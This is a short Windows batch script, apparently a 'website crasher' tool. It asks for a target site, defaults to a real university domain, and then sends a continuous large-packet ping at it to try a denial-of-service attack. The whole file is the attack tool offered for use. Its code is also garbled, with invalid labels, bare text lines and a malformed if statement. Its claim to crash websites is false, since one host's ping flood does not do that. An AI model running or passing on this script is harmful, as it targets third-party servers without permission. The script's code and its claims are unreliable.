':A
@echo off
DevSoft Website Crasher
color 0e
echo Enter the website you would like to crash
set input=http://utm.ro
set /p input=Enter your Website here:
if %input%==goto A if NOT B
echo Processing Your request
ping localhost>nul
echo To end Crashing press CTRL + C
ping localhost>nul
cls
echo -----------------------------------
echo Now we will crash the WEBSITE
echo Please don't close this window!
TO END!!
echo -----------------------------------
ping %input% -t -l 1000
